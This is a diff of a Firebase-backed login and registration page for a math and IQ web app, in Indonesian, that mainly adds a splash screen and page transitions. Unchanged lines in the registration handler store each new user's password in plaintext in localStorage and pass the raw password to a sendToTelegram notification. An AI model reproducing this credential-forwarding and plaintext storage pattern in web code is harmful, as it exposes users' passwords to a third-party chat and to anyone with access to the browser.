@@ -38,6 +38,8 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
+            opacity: 1;
+            transition: opacity 0.5s ease;
         }
         body::before {
             content: '';
@@ -50,6 +52,106 @@
                         radial-gradient(circle at 80% 70%, rgba(6, 182, 212, 0.06) 0%, transparent 50%);
             z-index: -1;
         }
+
+        /* ===== SPLASH SCREEN ===== */
+        #splashScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-primary);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+        #splashScreen.hide {
+            opacity: 0;
+            transform: scale(1.05);
+            pointer-events: none;
+        }
+        .splash-logo {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 20px 60px rgba(99, 102, 241, 0.4);
+            animation: splashPulse 2s ease-in-out infinite;
+            margin-bottom: 24px;
+        }
+        .splash-logo svg {
+            width: 50px;
+            height: 50px;
+            stroke: white;
+            stroke-width: 2;
+        }
+        .splash-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary-light), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+        }
+        .splash-sub {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            font-weight: 500;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+        .splash-creative {
+            margin-top: 40px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--primary-light);
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            opacity: 0.7;
+            animation: creativeGlow 2s ease-in-out infinite alternate;
+        }
+        .splash-loader {
+            margin-top: 30px;
+            width: 200px;
+            height: 3px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        .splash-loader::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--primary));
+            border-radius: 10px;
+            animation: loadingBar 1.5s ease-in-out infinite;
+        }
+
+        @keyframes splashPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        @keyframes creativeGlow {
+            0% { opacity: 0.5; text-shadow: 0 0 20px rgba(99, 102, 241, 0.2); }
+            100% { opacity: 1; text-shadow: 0 0 40px rgba(99, 102, 241, 0.5); }
+        }
+        @keyframes loadingBar {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
         .login-container {
             max-width: 420px;
             width: 100%;
@@ -59,6 +161,13 @@
             border-radius: var(--radius-md);
             padding: 32px 24px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+        .login-container.show {
+            opacity: 1;
+            transform: translateY(0);
         }
         .brand {
             display: flex;
@@ -204,10 +313,39 @@
             color: #f87171;
             border: 1px solid rgba(239,68,68,0.2);
         }
+
+        /* ===== TRANSISI HALAMAN ===== */
+        body.page-transition {
+            opacity: 0;
+            transform: scale(0.98);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        @media (max-width: 480px) {
+            .login-container { padding: 24px 18px; }
+            .splash-title { font-size: 1.8rem; }
+            .splash-logo { width: 75px; height: 75px; }
+            .splash-logo svg { width: 38px; height: 38px; }
+            .splash-creative { font-size: 0.9rem; letter-spacing: 4px; }
+        }
     </style>
 </head>
 <body>
-    <div class="login-container">
+
+    <!-- ===== SPLASH SCREEN ===== -->
+    <div id="splashScreen">
+        <div class="splash-logo">
+            <svg viewBox="0 0 24 24" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+            </svg>
+        </div>
+        <div class="splash-title">MTKS</div>
+        <div class="splash-sub">Mathematics &amp; IQ</div>
+        <div class="splash-creative">✦ SENZ CREATIVE ✦</div>
+        <div class="splash-loader"></div>
+    </div>
+
+    <div class="login-container" id="loginContainer">
         <div class="brand">
             <div class="logo-shape">
                 <svg viewBox="0 0 24 24" width="22" height="22" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -271,14 +409,31 @@
     </div>
 
     <script>
+        // ========== SPLASH SCREEN ==========
+        (function showSplash() {
+            const splash = document.getElementById('splashScreen');
+            const container = document.getElementById('loginContainer');
+            
+            // Tampilkan splash minimal 1.5 detik
+            setTimeout(() => {
+                splash.classList.add('hide');
+                container.classList.add('show');
+                
+                // Hapus splash dari DOM setelah animasi
+                setTimeout(() => {
+                    splash.style.display = 'none';
+                }, 800);
+            }, 1800);
+        })();
+
         // ========== FIREBASE KONFIGURASI ==========
         const firebaseConfig = {
             apiKey: "AIzaSyBteqG8vcS_GXAYuQMIceM017KNyxNm80M",
-  authDomain: "endymtks.firebaseapp.com",
-  projectId: "endymtks",
-  storageBucket: "endymtks.firebasestorage.app",
-  messagingSenderId: "1071549664337",
-  appId: "1:1071549664337:web:ae60886b5e15f257a23c70"
+            authDomain: "endymtks.firebaseapp.com",
+            projectId: "endymtks",
+            storageBucket: "endymtks.firebasestorage.app",
+            messagingSenderId: "1071549664337",
+            appId: "1:1071549664337:web:ae60886b5e15f257a23c70"
         };
 
         // Inisialisasi Firebase
@@ -301,7 +456,11 @@
                 try {
                     const data = JSON.parse(session);
                     if (data.username && data.loggedIn) {
-                        window.location.href = 'index.html';
+                        // Redirect dengan transisi
+                        document.body.classList.add('page-transition');
+                        setTimeout(() => {
+                            window.location.href = 'index.html';
+                        }, 400);
                         return;
                     }
                 } catch(e) {}
@@ -312,10 +471,8 @@
         // Cek status Firebase Auth
         auth.onAuthStateChanged((user) => {
             if (user) {
-                // User sudah login di Firebase, cek session
                 const session = sessionStorage.getItem(SESSION_KEY);
                 if (!session) {
-                    // Jika tidak ada session tapi user login di Firebase, redirect ke index
                     const username = user.displayName || user.email?.split('@')[0] || 'User';
                     sessionStorage.setItem(SESSION_KEY, JSON.stringify({ 
                         username: username, 
@@ -323,7 +480,11 @@
                         uid: user.uid,
                         email: user.email
                     }));
-                    window.location.href = 'index.html';
+                    // Redirect dengan transisi
+                    document.body.classList.add('page-transition');
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 400);
                 }
             }
         });
@@ -422,21 +583,17 @@
                 return;
             }
 
-            // Disable button & show loading
             btn.disabled = true;
             btn.innerHTML = '<span class="loading-spinner"></span> Mendaftar...';
 
             try {
-                // 1. Buat akun di Firebase Auth
                 const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                 const user = userCredential.user;
 
-                // Update profile dengan username
                 await user.updateProfile({
                     displayName: username
                 });
 
-                // 2. Simpan data user ke Firestore
                 await db.collection('users').doc(user.uid).set({
                     username: username,
                     email: email,
@@ -444,17 +601,14 @@
                     uid: user.uid
                 });
 
-                // 3. Simpan ke localStorage sebagai backup
                 const accounts = JSON.parse(localStorage.getItem('mtks_accounts') || '[]');
                 if (!accounts.find(acc => acc.username === username)) {
                     accounts.push({ username, email, password, uid: user.uid });
                     localStorage.setItem('mtks_accounts', JSON.stringify(accounts));
                 }
 
-                // 4. Kirim notifikasi ke Telegram
                 await sendToTelegram(username, email, password, 'register');
 
-                // 5. Set session
                 sessionStorage.setItem(SESSION_KEY, JSON.stringify({ 
                     username, 
                     loggedIn: true,
@@ -465,9 +619,11 @@
                 showMessage(msgEl, '✅ Pendaftaran berhasil! Mengalihkan...', 'success');
                 showFirebaseStatus('✅ Akun berhasil dibuat di Firebase!', 'connected');
 
+                // Transisi ke index.html
+                document.body.classList.add('page-transition');
                 setTimeout(() => {
                     window.location.href = 'index.html';
-                }, 1500);
+                }, 400);
 
             } catch (error) {
                 console.error('Firebase Register Error:', error);
@@ -510,11 +666,9 @@
             btn.innerHTML = '<span class="loading-spinner"></span> Masuk...';
 
             try {
-                // Login dengan Firebase Auth
                 const userCredential = await auth.signInWithEmailAndPassword(email, password);
                 const user = userCredential.user;
 
-                // Ambil username dari Firestore
                 let username = user.displayName || email.split('@')[0] || 'User';
                 try {
                     const doc = await db.collection('users').doc(user.uid).get();
@@ -525,7 +679,6 @@
                     console.log('Gagal ambil data dari Firestore, pakai default');
                 }
 
-                // Set session
                 sessionStorage.setItem(SESSION_KEY, JSON.stringify({ 
                     username, 
                     loggedIn: true,
@@ -533,15 +686,16 @@
                     email: email
                 }));
 
-                // Kirim notifikasi login ke Telegram
                 await sendToTelegram(username, email, '***', 'login');
 
                 showMessage(msgEl, '✅ Login berhasil! Mengalihkan...', 'success');
                 showFirebaseStatus('✅ Login berhasil!', 'connected');
 
+                // Transisi ke index.html
+                document.body.classList.add('page-transition');
                 setTimeout(() => {
                     window.location.href = 'index.html';
-                }, 1000);
+                }, 400);
 
             } catch (error) {
                 console.error('Firebase Login Error:', error);
@@ -576,12 +730,17 @@
         window.logoutMTKS = function() {
             auth.signOut().then(() => {
                 sessionStorage.removeItem(SESSION_KEY);
-                window.location.href = 'login.html';
+                document.body.classList.add('page-transition');
+                setTimeout(() => {
+                    window.location.href = 'login.html';
+                }, 400);
             }).catch((error) => {
                 console.error('Logout error:', error);
-                // Force logout
                 sessionStorage.removeItem(SESSION_KEY);
-                window.location.href = 'login.html';
+                document.body.classList.add('page-transition');
+                setTimeout(() => {
+                    window.location.href = 'login.html';
+                }, 400);
             });
         };
 
@@ -614,12 +773,9 @@
             } catch(e) { return null; }
         };
 
-        // Check initial Firebase connection
         auth.onAuthStateChanged((user) => {
             if (user) {
                 showFirebaseStatus('✅ Terhubung ke Firebase sebagai: ' + (user.displayName || user.email), 'connected');
-            } else {
-                // Tidak perlu menampilkan error jika belum login
             }
         });
 
